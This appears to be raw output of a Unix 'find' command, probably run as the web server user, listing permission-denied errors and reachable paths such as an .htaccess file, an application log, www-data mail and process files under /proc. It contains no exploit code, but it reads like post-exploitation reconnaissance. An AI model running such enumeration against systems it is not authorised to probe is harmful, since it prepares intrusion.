+find: '/var/cache/apt/archives/partial': Permission denied
+find: '/var/cache/apparmor/ea9ed67a.0': Permission denied
+find: '/var/lib/php/sessions': Permission denied
+find: '/var/lib/private': Permission denied
+find: '/var/lib/apt/lists/partial': Permission denied
+find: '/var/lib/mysql/performance_schema': Permission denied
+find: '/var/lib/mysql/mysql': Permission denied
+find: '/var/lib/mysql/ona_onadb': Permission denied
+find: '/var/lib/mysql/onadb': Permission denied
+find: '/var/spool/cron/crontabs': Permission denied
+find: '/var/spool/exim4': Permission denied
+find: '/var/spool/rsyslog': Permission denied
+/var/www/html/reports/.htaccess
+find: '/var/log/private': Permission denied
+find: '/var/log/apache2': Permission denied
+find: '/var/log/mysql': Permission denied
+find: '/var/log/exim4': Permission denied
+/var/log/ona.log
+/var/mail/www-data
+find: '/var/webmin': Permission denied
+find: '/lost+found': Permission denied
+find: '/proc/tty/driver': Permission denied
+find: '/proc/1/task/1/fd': Permission denied
+find: '/proc/1/task/1/fdinfo': Permission denied
+find: '/proc/1/task/1/ns': Permission denied
+find: '/proc/1/fd': Permission denied
+find: '/proc/1/map_files': Permission denied
+find: '/proc/1/fdinfo': Permission denied
+find: '/proc/1/ns': Permission denied
+find: '/proc/2/task/2/fd': Permission denied
+find: '/proc/2/task/2/fdinfo': Permission denied
+find: '/proc/2/task/2/ns': Permission denied
+find: '/proc/2/fd': Permission denied
+find: '/proc/2/map_files': Permission denied
+find: '/proc/2/fdinfo': Permission denied
+find: '/proc/2/ns': Permission denied
+find: '/proc/3/task/3/fd': Permission denied
+find: '/proc/3/task/3/fdinfo': Permission denied
+find: '/proc/3/task/3/ns': Permission denied
+find: '/proc/3/fd': Permission denied
+find: '/proc/3/map_files': Permission denied
+find: '/proc/3/fdinfo': Permission denied
+find: '/proc/3/ns': Permission denied
+find: '/proc/4/task/4/fd': Permission denied
+find: '/proc/4/task/4/fdinfo': Permission denied
+find: '/proc/4/task/4/ns': Permission denied
+find: '/proc/4/fd': Permission denied
+find: '/proc/4/map_files': Permission denied
+find: '/proc/4/fdinfo': Permission denied
+find: '/proc/4/ns': Permission denied
+find: '/proc/6/task/6/fd': Permission denied
+find: '/proc/6/task/6/fdinfo': Permission denied
+find: '/proc/6/task/6/ns': Permission denied
+find: '/proc/6/fd': Permission denied
+find: '/proc/6/map_files': Permission denied
+find: '/proc/6/fdinfo': Permission denied
+find: '/proc/6/ns': Permission denied
+find: '/proc/8/task/8/fd': Permission denied
+find: '/proc/8/task/8/fdinfo': Permission denied
+find: '/proc/8/task/8/ns': Permission denied
+find: '/proc/8/fd': Permission denied
+find: '/proc/8/map_files': Permission denied
+find: '/proc/8/fdinfo': Permission denied
+find: '/proc/8/ns': Permission denied
+find: '/proc/9/task/9/fd': Permission denied
+find: '/proc/9/task/9/fdinfo': Permission denied
+find: '/proc/9/task/9/ns': Permission denied
+find: '/proc/9/fd': Permission denied
+find: '/proc/9/map_files': Permission denied
+find: '/proc/9/fdinfo': Permission denied
+find: '/proc/9/ns': Permission denied
+find: '/proc/10/task/10/fd': Permission denied
+find: '/proc/10/task/10/fdinfo': Permission denied
+find: '/proc/10/task/10/ns': Permission denied
+find: '/proc/10/fd': Permission denied
+find: '/proc/10/map_files': Permission denied
+find: '/proc/10/fdinfo': Permission denied
+find: '/proc/10/ns': Permission denied
+find: '/proc/11/task/11/fd': Permission denied
+find: '/proc/11/task/11/fdinfo': Permission denied
+find: '/proc/11/task/11/ns': Permission denied
+find: '/proc/11/fd': Permission denied
+find: '/proc/11/map_files': Permission denied
+find: '/proc/11/fdinfo': Permission denied
+find: '/proc/11/ns': Permission denied
+find: '/proc/12/task/12/fd': Permission denied
+find: '/proc/12/task/12/fdinfo': Permission denied
+find: '/proc/12/task/12/ns': Permission denied
+find: '/proc/12/fd': Permission denied
+find: '/proc/12/map_files': Permission denied
+find: '/proc/12/fdinfo': Permission denied
+find: '/proc/12/ns': Permission denied
+find: '/proc/13/task/13/fd': Permission denied
+find: '/proc/13/task/13/fdinfo': Permission denied
+find: '/proc/13/task/13/ns': Permission denied
+find: '/proc/13/fd': Permission denied
+find: '/proc/13/map_files': Permission denied
+find: '/proc/13/fdinfo': Permission denied
+find: '/proc/13/ns': Permission denied
+find: '/proc/14/task/14/fd': Permission denied
+find: '/proc/14/task/14/fdinfo': Permission denied
+find: '/proc/14/task/14/ns': Permission denied
+find: '/proc/14/fd': Permission denied
+find: '/proc/14/map_files': Permission denied
+find: '/proc/14/fdinfo': Permission denied
+find: '/proc/14/ns': Permission denied
+find: '/proc/15/task/15/fd': Permission denied
+find: '/proc/15/task/15/fdinfo': Permission denied
+find: '/proc/15/task/15/ns': Permission denied
+find: '/proc/15/fd': Permission denied
+find: '/proc/15/map_files': Permission denied
+find: '/proc/15/fdinfo': Permission denied
+find: '/proc/15/ns': Permission denied
+find: '/proc/16/task/16/fd': Permission denied
+find: '/proc/16/task/16/fdinfo': Permission denied
+find: '/proc/16/task/16/ns': Permission denied
+find: '/proc/16/fd': Permission denied
+find: '/proc/16/map_files': Permission denied
+find: '/proc/16/fdinfo': Permission denied
+find: '/proc/16/ns': Permission denied
+find: '/proc/17/task/17/fd': Permission denied
+find: '/proc/17/task/17/fdinfo': Permission denied
+find: '/proc/17/task/17/ns': Permission denied
+find: '/proc/17/fd': Permission denied
+find: '/proc/17/map_files': Permission denied
+find: '/proc/17/fdinfo': Permission denied
+find: '/proc/17/ns': Permission denied
+find: '/proc/18/task/18/fd': Permission denied
+find: '/proc/18/task/18/fdinfo': Permission denied
+find: '/proc/18/task/18/ns': Permission denied
+find: '/proc/18/fd': Permission denied
+find: '/proc/18/map_files': Permission denied
+find: '/proc/18/fdinfo': Permission denied
+find: '/proc/18/ns': Permission denied
+find: '/proc/19/task/19/fd': Permission denied
+find: '/proc/19/task/19/fdinfo': Permission denied
+find: '/proc/19/task/19/ns': Permission denied
+find: '/proc/19/fd': Permission denied
+find: '/proc/19/map_files': Permission denied
+find: '/proc/19/fdinfo': Permission denied
+find: '/proc/19/ns': Permission denied
+find: '/proc/20/task/20/fd': Permission denied
+find: '/proc/20/task/20/fdinfo': Permission denied
+find: '/proc/20/task/20/ns': Permission denied
+find: '/proc/20/fd': Permission denied
+find: '/proc/20/map_files': Permission denied
+find: '/proc/20/fdinfo': Permission denied
+find: '/proc/20/ns': Permission denied
+find: '/proc/21/task/21/fd': Permission denied
+find: '/proc/21/task/21/fdinfo': Permission denied
+find: '/proc/21/task/21/ns': Permission denied
+find: '/proc/21/fd': Permission denied
+find: '/proc/21/map_files': Permission denied
+find: '/proc/21/fdinfo': Permission denied
+find: '/proc/21/ns': Permission denied
+find: '/proc/22/task/22/fd': Permission denied
+find: '/proc/22/task/22/fdinfo': Permission denied
+find: '/proc/22/task/22/ns': Permission denied
+find: '/proc/22/fd': Permission denied
+find: '/proc/22/map_files': Permission denied
+find: '/proc/22/fdinfo': Permission denied
+find: '/proc/22/ns': Permission denied
+find: '/proc/23/task/23/fd': Permission denied
+find: '/proc/23/task/23/fdinfo': Permission denied
+find: '/proc/23/task/23/ns': Permission denied
+find: '/proc/23/fd': Permission denied
+find: '/proc/23/map_files': Permission denied
+find: '/proc/23/fdinfo': Permission denied
+find: '/proc/23/ns': Permission denied
+find: '/proc/24/task/24/fd': Permission denied
+find: '/proc/24/task/24/fdinfo': Permission denied
+find: '/proc/24/task/24/ns': Permission denied
+find: '/proc/24/fd': Permission denied
+find: '/proc/24/map_files': Permission denied
+find: '/proc/24/fdinfo': Permission denied
+find: '/proc/24/ns': Permission denied
+find: '/proc/25/task/25/fd': Permission denied
+find: '/proc/25/task/25/fdinfo': Permission denied
+find: '/proc/25/task/25/ns': Permission denied
+find: '/proc/25/fd': Permission denied
+find: '/proc/25/map_files': Permission denied
+find: '/proc/25/fdinfo': Permission denied
+find: '/proc/25/ns': Permission denied
+find: '/proc/26/task/26/fd': Permission denied
+find: '/proc/26/task/26/fdinfo': Permission denied
+find: '/proc/26/task/26/ns': Permission denied
+find: '/proc/26/fd': Permission denied
+find: '/proc/26/map_files': Permission denied
+find: '/proc/26/fdinfo': Permission denied
+find: '/proc/26/ns': Permission denied
+find: '/proc/27/task/27/fd': Permission denied
+find: '/proc/27/task/27/fdinfo': Permission denied
+find: '/proc/27/task/27/ns': Permission denied
+find: '/proc/27/fd': Permission denied
+find: '/proc/27/map_files': Permission denied
+find: '/proc/27/fdinfo': Permission denied
+find: '/proc/27/ns': Permission denied
+find: '/proc/28/task/28/fd': Permission denied
+find: '/proc/28/task/28/fdinfo': Permission denied
+find: '/proc/28/task/28/ns': Permission denied
+find: '/proc/28/fd': Permission denied
+find: '/proc/28/map_files': Permission denied
+find: '/proc/28/fdinfo': Permission denied
+find: '/proc/28/ns': Permission denied
+find: '/proc/29/task/29/fd': Permission denied
+find: '/proc/29/task/29/fdinfo': Permission denied
+find: '/proc/29/task/29/ns': Permission denied
+find: '/proc/29/fd': Permission denied
+find: '/proc/29/map_files': Permission denied
+find: '/proc/29/fdinfo': Permission denied
+find: '/proc/29/ns': Permission denied
+find: '/proc/30/task/30/fd': Permission denied
+find: '/proc/30/task/30/fdinfo': Permission denied
+find: '/proc/30/task/30/ns': Permission denied
+find: '/proc/30/fd': Permission denied
+find: '/proc/30/map_files': Permission denied
+find: '/proc/30/fdinfo': Permission denied
+find: '/proc/30/ns': Permission denied
+find: '/proc/48/task/48/fd': Permission denied
+find: '/proc/48/task/48/fdinfo': Permission denied
+find: '/proc/48/task/48/ns': Permission denied
+find: '/proc/48/fd': Permission denied
+find: '/proc/48/map_files': Permission denied
+find: '/proc/48/fdinfo': Permission denied
+find: '/proc/48/ns': Permission denied
+find: '/proc/49/task/49/fd': Permission denied
+find: '/proc/49/task/49/fdinfo': Permission denied
+find: '/proc/49/task/49/ns': Permission denied
+find: '/proc/49/fd': Permission denied
+find: '/proc/49/map_files': Permission denied
+find: '/proc/49/fdinfo': Permission denied
+find: '/proc/49/ns': Permission denied
+find: '/proc/50/task/50/fd': Permission denied
+find: '/proc/50/task/50/fdinfo': Permission denied
+find: '/proc/50/task/50/ns': Permission denied
+find: '/proc/50/fd': Permission denied
+find: '/proc/50/map_files': Permission denied
+find: '/proc/50/fdinfo': Permission denied
+find: '/proc/50/ns': Permission denied
+find: '/proc/59/task/59/fd': Permission denied
+find: '/proc/59/task/59/fdinfo': Permission denied
+find: '/proc/59/task/59/ns': Permission denied
+find: '/proc/59/fd': Permission denied
+find: '/proc/59/map_files': Permission denied
+find: '/proc/59/fdinfo': Permission denied
+find: '/proc/59/ns': Permission denied
+find: '/proc/95/task/95/fd': Permission denied
+find: '/proc/95/task/95/fdinfo': Permission denied
+find: '/proc/95/task/95/ns': Permission denied
+find: '/proc/95/fd': Permission denied
+find: '/proc/95/map_files': Permission denied
+find: '/proc/95/fdinfo': Permission denied
+find: '/proc/95/ns': Permission denied
+find: '/proc/104/task/104/fd': Permission denied
+find: '/proc/104/task/104/fdinfo': Permission denied
+find: '/proc/104/task/104/ns': Permission denied
+find: '/proc/104/fd': Permission denied
+find: '/proc/104/map_files': Permission denied
+find: '/proc/104/fdinfo': Permission denied
+find: '/proc/104/ns': Permission denied
+find: '/proc/108/task/108/fd': Permission denied
+find: '/proc/108/task/108/fdinfo': Permission denied
+find: '/proc/108/task/108/ns': Permission denied
+find: '/proc/108/fd': Permission denied
+find: '/proc/108/map_files': Permission denied
+find: '/proc/108/fdinfo': Permission denied
+find: '/proc/108/ns': Permission denied
+find: '/proc/109/task/109/fd': Permission denied
+find: '/proc/109/task/109/fdinfo': Permission denied
+find: '/proc/109/task/109/ns': Permission denied
+find: '/proc/109/fd': Permission denied
+find: '/proc/109/map_files': Permission denied
+find: '/proc/109/fdinfo': Permission denied
+find: '/proc/109/ns': Permission denied
+find: '/proc/111/task/111/fd': Permission denied
+find: '/proc/111/task/111/fdinfo': Permission denied
+find: '/proc/111/task/111/ns': Permission denied
+find: '/proc/111/fd': Permission denied
+find: '/proc/111/map_files': Permission denied
+find: '/proc/111/fdinfo': Permission denied
+find: '/proc/111/ns': Permission denied
+find: '/proc/112/task/112/fd': Permission denied
+find: '/proc/112/task/112/fdinfo': Permission denied
+find: '/proc/112/task/112/ns': Permission denied
+find: '/proc/112/fd': Permission denied
+find: '/proc/112/map_files': Permission denied
+find: '/proc/112/fdinfo': Permission denied
+find: '/proc/112/ns': Permission denied
+find: '/proc/113/task/113/fd': Permission denied
+find: '/proc/113/task/113/fdinfo': Permission denied
+find: '/proc/113/task/113/ns': Permission denied
+find: '/proc/113/fd': Permission denied
+find: '/proc/113/map_files': Permission denied
+find: '/proc/113/fdinfo': Permission denied
+find: '/proc/113/ns': Permission denied
+find: '/proc/115/task/115/fd': Permission denied
+find: '/proc/115/task/115/fdinfo': Permission denied
+find: '/proc/115/task/115/ns': Permission denied
+find: '/proc/115/fd': Permission denied
+find: '/proc/115/map_files': Permission denied
+find: '/proc/115/fdinfo': Permission denied
+find: '/proc/115/ns': Permission denied
+find: '/proc/117/task/117/fd': Permission denied
+find: '/proc/117/task/117/fdinfo': Permission denied
+find: '/proc/117/task/117/ns': Permission denied
+find: '/proc/117/fd': Permission denied
+find: '/proc/117/map_files': Permission denied
+find: '/proc/117/fdinfo': Permission denied
+find: '/proc/117/ns': Permission denied
+find: '/proc/153/task/153/fd': Permission denied
+find: '/proc/153/task/153/fdinfo': Permission denied
+find: '/proc/153/task/153/ns': Permission denied
+find: '/proc/153/fd': Permission denied
+find: '/proc/153/map_files': Permission denied
+find: '/proc/153/fdinfo': Permission denied
+find: '/proc/153/ns': Permission denied
+find: '/proc/181/task/181/fd': Permission denied
+find: '/proc/181/task/181/fdinfo': Permission denied
+find: '/proc/181/task/181/ns': Permission denied
+find: '/proc/181/fd': Permission denied
+find: '/proc/181/map_files': Permission denied
+find: '/proc/181/fdinfo': Permission denied
+find: '/proc/181/ns': Permission denied
+find: '/proc/183/task/183/fd': Permission denied
+find: '/proc/183/task/183/fdinfo': Permission denied
+find: '/proc/183/task/183/ns': Permission denied
+find: '/proc/183/fd': Permission denied
+find: '/proc/183/map_files': Permission denied
+find: '/proc/183/fdinfo': Permission denied
+find: '/proc/183/ns': Permission denied
+find: '/proc/184/task/184/fd': Permission denied
+find: '/proc/184/task/184/fdinfo': Permission denied
+find: '/proc/184/task/184/ns': Permission denied
+find: '/proc/184/fd': Permission denied
+find: '/proc/184/map_files': Permission denied
+find: '/proc/184/fdinfo': Permission denied
+find: '/proc/184/ns': Permission denied
+find: '/proc/216/task/216/fd': Permission denied
+find: '/proc/216/task/216/fdinfo': Permission denied
+find: '/proc/216/task/216/ns': Permission denied
+find: '/proc/216/fd': Permission denied
+find: '/proc/216/map_files': Permission denied
+find: '/proc/216/fdinfo': Permission denied
+find: '/proc/216/ns': Permission denied
+find: '/proc/233/task/233/fd': Permission denied
+find: '/proc/233/task/233/fdinfo': Permission denied
+find: '/proc/233/task/233/ns': Permission denied
+find: '/proc/233/fd': Permission denied
+find: '/proc/233/map_files': Permission denied
+find: '/proc/233/fdinfo': Permission denied
+find: '/proc/233/ns': Permission denied
+find: '/proc/287/task/287/fd': Permission denied
+find: '/proc/287/task/287/fdinfo': Permission denied
+find: '/proc/287/task/287/ns': Permission denied
+find: '/proc/287/fd': Permission denied
+find: '/proc/287/map_files': Permission denied
+find: '/proc/287/fdinfo': Permission denied
+find: '/proc/287/ns': Permission denied
+find: '/proc/325/task/325/fd': Permission denied
+find: '/proc/325/task/325/fdinfo': Permission denied
+find: '/proc/325/task/325/ns': Permission denied
+find: '/proc/325/task/374/fd': Permission denied
+find: '/proc/325/task/374/fdinfo': Permission denied
+find: '/proc/325/task/374/ns': Permission denied
+find: '/proc/325/fd': Permission denied
+find: '/proc/325/map_files': Permission denied
+find: '/proc/325/fdinfo': Permission denied
+find: '/proc/325/ns': Permission denied
+find: '/proc/362/task/362/fd': Permission denied
+find: '/proc/362/task/362/fdinfo': Permission denied
+find: '/proc/362/task/362/ns': Permission denied
+find: '/proc/362/fd': Permission denied
+find: '/proc/362/map_files': Permission denied
+find: '/proc/362/fdinfo': Permission denied
+find: '/proc/362/ns': Permission denied
+find: '/proc/369/task/369/fd': Permission denied
+find: '/proc/369/task/369/fdinfo': Permission denied
+find: '/proc/369/task/369/ns': Permission denied
+find: '/proc/369/task/380/fd': Permission denied
+find: '/proc/369/task/380/fdinfo': Permission denied
+find: '/proc/369/task/380/ns': Permission denied
+find: '/proc/369/task/381/fd': Permission denied
+find: '/proc/369/task/381/fdinfo': Permission denied
+find: '/proc/369/task/381/ns': Permission denied
+find: '/proc/369/task/383/fd': Permission denied
+find: '/proc/369/task/383/fdinfo': Permission denied
+find: '/proc/369/task/383/ns': Permission denied
+find: '/proc/369/fd': Permission denied
+find: '/proc/369/map_files': Permission denied
+find: '/proc/369/fdinfo': Permission denied
+find: '/proc/369/ns': Permission denied
+find: '/proc/370/task/370/fd': Permission denied
+find: '/proc/370/task/370/fdinfo': Permission denied
+find: '/proc/370/task/370/ns': Permission denied
+find: '/proc/370/fd': Permission denied
+find: '/proc/370/map_files': Permission denied
+find: '/proc/370/fdinfo': Permission denied
+find: '/proc/370/ns': Permission denied
+find: '/proc/371/task/371/fd': Permission denied
+find: '/proc/371/task/371/fdinfo': Permission denied
+find: '/proc/371/task/371/ns': Permission denied
+find: '/proc/371/fd': Permission denied
+find: '/proc/371/map_files': Permission denied
+find: '/proc/371/fdinfo': Permission denied
+find: '/proc/371/ns': Permission denied
+find: '/proc/378/task/378/fd': Permission denied
+find: '/proc/378/task/378/fdinfo': Permission denied
+find: '/proc/378/task/378/ns': Permission denied
+find: '/proc/378/fd': Permission denied
+find: '/proc/378/map_files': Permission denied
+find: '/proc/378/fdinfo': Permission denied
+find: '/proc/378/ns': Permission denied
+find: '/proc/390/task/390/fd': Permission denied
+find: '/proc/390/task/390/fdinfo': Permission denied
+find: '/proc/390/task/390/ns': Permission denied
+find: '/proc/390/fd': Permission denied
+find: '/proc/390/map_files': Permission denied
+find: '/proc/390/fdinfo': Permission denied
+find: '/proc/390/ns': Permission denied
+find: '/proc/400/task/400/fd': Permission denied
+find: '/proc/400/task/400/fdinfo': Permission denied
+find: '/proc/400/task/400/ns': Permission denied
+find: '/proc/400/fd': Permission denied
+find: '/proc/400/map_files': Permission denied
+find: '/proc/400/fdinfo': Permission denied
+find: '/proc/400/ns': Permission denied
+find: '/proc/432/task/432/fd': Permission denied
+find: '/proc/432/task/432/fdinfo': Permission denied
+find: '/proc/432/task/432/ns': Permission denied
+find: '/proc/432/fd': Permission denied
+find: '/proc/432/map_files': Permission denied
+find: '/proc/432/fdinfo': Permission denied
+find: '/proc/432/ns': Permission denied
+find: '/proc/454/task/454/fd': Permission denied
+find: '/proc/454/task/454/fdinfo': Permission denied
+find: '/proc/454/task/454/ns': Permission denied
+find: '/proc/454/fd': Permission denied
+find: '/proc/454/map_files': Permission denied
+find: '/proc/454/fdinfo': Permission denied
+find: '/proc/454/ns': Permission denied
+find: '/proc/455/task/455/fd': Permission denied
+find: '/proc/455/task/455/fdinfo': Permission denied
+find: '/proc/455/task/455/ns': Permission denied
+find: '/proc/455/fd': Permission denied
+find: '/proc/455/map_files': Permission denied
+find: '/proc/455/fdinfo': Permission denied
+find: '/proc/455/ns': Permission denied
+find: '/proc/456/task/456/fd': Permission denied
+find: '/proc/456/task/456/fdinfo': Permission denied
+find: '/proc/456/task/456/ns': Permission denied
+find: '/proc/456/fd': Permission denied
+find: '/proc/456/map_files': Permission denied
+find: '/proc/456/fdinfo': Permission denied
+find: '/proc/456/ns': Permission denied
+find: '/proc/457/task/457/fd': Permission denied
+find: '/proc/457/task/457/fdinfo': Permission denied
+find: '/proc/457/task/457/ns': Permission denied
+find: '/proc/457/fd': Permission denied
+find: '/proc/457/map_files': Permission denied
+find: '/proc/457/fdinfo': Permission denied
+find: '/proc/457/ns': Permission denied
+find: '/proc/458/task/458/fd': Permission denied
+find: '/proc/458/task/458/fdinfo': Permission denied
+find: '/proc/458/task/458/ns': Permission denied
+find: '/proc/458/fd': Permission denied
+find: '/proc/458/map_files': Permission denied
+find: '/proc/458/fdinfo': Permission denied
+find: '/proc/458/ns': Permission denied
+find: '/proc/480/task/480/fd': Permission denied
+find: '/proc/480/task/480/fdinfo': Permission denied
+find: '/proc/480/task/480/ns': Permission denied
+find: '/proc/480/task/500/fd': Permission denied
+find: '/proc/480/task/500/fdinfo': Permission denied
+find: '/proc/480/task/500/ns': Permission denied
+find: '/proc/480/task/501/fd': Permission denied
+find: '/proc/480/task/501/fdinfo': Permission denied
+find: '/proc/480/task/501/ns': Permission denied
+find: '/proc/480/task/502/fd': Permission denied
+find: '/proc/480/task/502/fdinfo': Permission denied
+find: '/proc/480/task/502/ns': Permission denied
+find: '/proc/480/task/503/fd': Permission denied
+find: '/proc/480/task/503/fdinfo': Permission denied
+find: '/proc/480/task/503/ns': Permission denied
+find: '/proc/480/task/504/fd': Permission denied
+find: '/proc/480/task/504/fdinfo': Permission denied
+find: '/proc/480/task/504/ns': Permission denied
+find: '/proc/480/task/505/fd': Permission denied
+find: '/proc/480/task/505/fdinfo': Permission denied
+find: '/proc/480/task/505/ns': Permission denied
+find: '/proc/480/task/506/fd': Permission denied
+find: '/proc/480/task/506/fdinfo': Permission denied
+find: '/proc/480/task/506/ns': Permission denied
+find: '/proc/480/task/507/fd': Permission denied
+find: '/proc/480/task/507/fdinfo': Permission denied
+find: '/proc/480/task/507/ns': Permission denied
+find: '/proc/480/task/508/fd': Permission denied
+find: '/proc/480/task/508/fdinfo': Permission denied
+find: '/proc/480/task/508/ns': Permission denied
+find: '/proc/480/task/509/fd': Permission denied
+find: '/proc/480/task/509/fdinfo': Permission denied
+find: '/proc/480/task/509/ns': Permission denied
+find: '/proc/480/task/510/fd': Permission denied
+find: '/proc/480/task/510/fdinfo': Permission denied
+find: '/proc/480/task/510/ns': Permission denied
+find: '/proc/480/task/511/fd': Permission denied
+find: '/proc/480/task/511/fdinfo': Permission denied
+find: '/proc/480/task/511/ns': Permission denied
+find: '/proc/480/task/512/fd': Permission denied
+find: '/proc/480/task/512/fdinfo': Permission denied
+find: '/proc/480/task/512/ns': Permission denied
+find: '/proc/480/task/515/fd': Permission denied
+find: '/proc/480/task/515/fdinfo': Permission denied
+find: '/proc/480/task/515/ns': Permission denied
+find: '/proc/480/task/516/fd': Permission denied
+find: '/proc/480/task/516/fdinfo': Permission denied
+find: '/proc/480/task/516/ns': Permission denied
+find: '/proc/480/task/517/fd': Permission denied
+find: '/proc/480/task/517/fdinfo': Permission denied
+find: '/proc/480/task/517/ns': Permission denied
+find: '/proc/480/task/518/fd': Permission denied
+find: '/proc/480/task/518/fdinfo': Permission denied
+find: '/proc/480/task/518/ns': Permission denied
+find: '/proc/480/task/519/fd': Permission denied
+find: '/proc/480/task/519/fdinfo': Permission denied
+find: '/proc/480/task/519/ns': Permission denied
+find: '/proc/480/task/520/fd': Permission denied
+find: '/proc/480/task/520/fdinfo': Permission denied
+find: '/proc/480/task/520/ns': Permission denied
+find: '/proc/480/task/521/fd': Permission denied
+find: '/proc/480/task/521/fdinfo': Permission denied
+find: '/proc/480/task/521/ns': Permission denied
+find: '/proc/480/task/522/fd': Permission denied
+find: '/proc/480/task/522/fdinfo': Permission denied
+find: '/proc/480/task/522/ns': Permission denied
+find: '/proc/480/task/523/fd': Permission denied
+find: '/proc/480/task/523/fdinfo': Permission denied
+find: '/proc/480/task/523/ns': Permission denied
+find: '/proc/480/task/524/fd': Permission denied
+find: '/proc/480/task/524/fdinfo': Permission denied
+find: '/proc/480/task/524/ns': Permission denied
+find: '/proc/480/task/525/fd': Permission denied
+find: '/proc/480/task/525/fdinfo': Permission denied
+find: '/proc/480/task/525/ns': Permission denied
+find: '/proc/480/task/526/fd': Permission denied
+find: '/proc/480/task/526/fdinfo': Permission denied
+find: '/proc/480/task/526/ns': Permission denied
+find: '/proc/480/task/527/fd': Permission denied
+find: '/proc/480/task/527/fdinfo': Permission denied
+find: '/proc/480/task/527/ns': Permission denied
+find: '/proc/480/task/528/fd': Permission denied
+find: '/proc/480/task/528/fdinfo': Permission denied
+find: '/proc/480/task/528/ns': Permission denied
+find: '/proc/480/task/529/fd': Permission denied
+find: '/proc/480/task/529/fdinfo': Permission denied
+find: '/proc/480/task/529/ns': Permission denied
+find: '/proc/480/task/530/fd': Permission denied
+find: '/proc/480/task/530/fdinfo': Permission denied
+find: '/proc/480/task/530/ns': Permission denied
+find: '/proc/480/task/1013/fd': Permission denied
+find: '/proc/480/task/1013/fdinfo': Permission denied
+find: '/proc/480/task/1013/ns': Permission denied
+find: '/proc/480/task/1020/fd': Permission denied
+find: '/proc/480/task/1020/fdinfo': Permission denied
+find: '/proc/480/task/1020/ns': Permission denied
+find: '/proc/480/task/1047/fd': Permission denied
+find: '/proc/480/task/1047/fdinfo': Permission denied
+find: '/proc/480/task/1047/ns': Permission denied
+find: '/proc/480/task/1054/fd': Permission denied
+find: '/proc/480/task/1054/fdinfo': Permission denied
+find: '/proc/480/task/1054/ns': Permission denied
+find: '/proc/480/task/1059/fd': Permission denied
+find: '/proc/480/task/1059/fdinfo': Permission denied
+find: '/proc/480/task/1059/ns': Permission denied
+find: '/proc/480/task/1120/fd': Permission denied
+find: '/proc/480/task/1120/fdinfo': Permission denied
+find: '/proc/480/task/1120/ns': Permission denied
+find: '/proc/480/task/1126/fd': Permission denied
+find: '/proc/480/task/1126/fdinfo': Permission denied
+find: '/proc/480/task/1126/ns': Permission denied
+find: '/proc/480/task/1147/fd': Permission denied
+find: '/proc/480/task/1147/fdinfo': Permission denied
+find: '/proc/480/task/1147/ns': Permission denied
+find: '/proc/480/task/1462/fd': Permission denied
+find: '/proc/480/task/1462/fdinfo': Permission denied
+find: '/proc/480/task/1462/ns': Permission denied
+find: '/proc/480/fd': Permission denied
+find: '/proc/480/map_files': Permission denied
+find: '/proc/480/fdinfo': Permission denied
+find: '/proc/480/ns': Permission denied
+find: '/proc/829/task/829/fd': Permission denied
+find: '/proc/829/task/829/fdinfo': Permission denied
+find: '/proc/829/task/829/ns': Permission denied
+find: '/proc/829/fd': Permission denied
+find: '/proc/829/map_files': Permission denied
+find: '/proc/829/fdinfo': Permission denied
+find: '/proc/829/ns': Permission denied
+find: '/proc/831/task/831/fd': Permission denied
+find: '/proc/831/task/831/fdinfo': Permission denied
+find: '/proc/831/task/831/ns': Permission denied
+find: '/proc/831/fd': Permission denied
+find: '/proc/831/map_files': Permission denied
+find: '/proc/831/fdinfo': Permission denied
+find: '/proc/831/ns': Permission denied
+find: '/proc/995/task/995/fd': Permission denied
+find: '/proc/995/task/995/fdinfo': Permission denied
+find: '/proc/995/task/995/ns': Permission denied
+find: '/proc/995/fd': Permission denied
+find: '/proc/995/map_files': Permission denied
+find: '/proc/995/fdinfo': Permission denied
+find: '/proc/995/ns': Permission denied
+find: '/proc/1021/task/1021/fd': Permission denied
+find: '/proc/1021/task/1021/fdinfo': Permission denied
+find: '/proc/1021/task/1021/ns': Permission denied
+find: '/proc/1021/fd': Permission denied
+find: '/proc/1021/map_files': Permission denied
+find: '/proc/1021/fdinfo': Permission denied
+find: '/proc/1021/ns': Permission denied
+find: '/proc/1022/task/1022/fd': Permission denied
+find: '/proc/1022/task/1022/fdinfo': Permission denied
+find: '/proc/1022/task/1022/ns': Permission denied
+find: '/proc/1022/fd': Permission denied
+find: '/proc/1022/map_files': Permission denied
+find: '/proc/1022/fdinfo': Permission denied
+find: '/proc/1022/ns': Permission denied
+find: '/proc/1023/task/1023/fd': Permission denied
+find: '/proc/1023/task/1023/fdinfo': Permission denied
+find: '/proc/1023/task/1023/ns': Permission denied
+find: '/proc/1023/fd': Permission denied
+find: '/proc/1023/map_files': Permission denied
+find: '/proc/1023/fdinfo': Permission denied
+find: '/proc/1023/ns': Permission denied
+/proc/1129/task/1129/fdinfo/0
+/proc/1129/task/1129/fdinfo/1
+/proc/1129/task/1129/fdinfo/2
+/proc/1129/task/1129/fdinfo/12
+/proc/1129/task/1129/environ
+/proc/1129/task/1129/auxv
+/proc/1129/task/1129/status
+/proc/1129/task/1129/personality
+/proc/1129/task/1129/limits
+/proc/1129/task/1129/sched
+/proc/1129/task/1129/comm
+/proc/1129/task/1129/syscall
+/proc/1129/task/1129/cmdline
+/proc/1129/task/1129/stat
+/proc/1129/task/1129/statm
+/proc/1129/task/1129/maps
+/proc/1129/task/1129/children
+/proc/1129/task/1129/numa_maps
+/proc/1129/task/1129/mem
+/proc/1129/task/1129/mounts
+/proc/1129/task/1129/mountinfo
+/proc/1129/task/1129/clear_refs
+/proc/1129/task/1129/smaps
+/proc/1129/task/1129/smaps_rollup
+/proc/1129/task/1129/pagemap
+/proc/1129/task/1129/attr/current
+/proc/1129/task/1129/attr/prev
+/proc/1129/task/1129/attr/exec
+/proc/1129/task/1129/attr/fscreate
+/proc/1129/task/1129/attr/keycreate
+/proc/1129/task/1129/attr/sockcreate
+/proc/1129/task/1129/wchan
+/proc/1129/task/1129/stack
+/proc/1129/task/1129/schedstat
+/proc/1129/task/1129/cpuset
+/proc/1129/task/1129/cgroup
+/proc/1129/task/1129/oom_score
+/proc/1129/task/1129/oom_adj
+/proc/1129/task/1129/oom_score_adj
+/proc/1129/task/1129/loginuid
+/proc/1129/task/1129/sessionid
+/proc/1129/task/1129/io
+/proc/1129/task/1129/uid_map
+/proc/1129/task/1129/gid_map
+/proc/1129/task/1129/projid_map
+/proc/1129/task/1129/setgroups
+/proc/1129/task/1129/patch_state
+/proc/1129/fdinfo/0
+/proc/1129/fdinfo/1
+/proc/1129/fdinfo/2
+/proc/1129/fdinfo/12
+/proc/1129/environ
+/proc/1129/auxv
+/proc/1129/status
+/proc/1129/personality
+/proc/1129/limits
+/proc/1129/sched
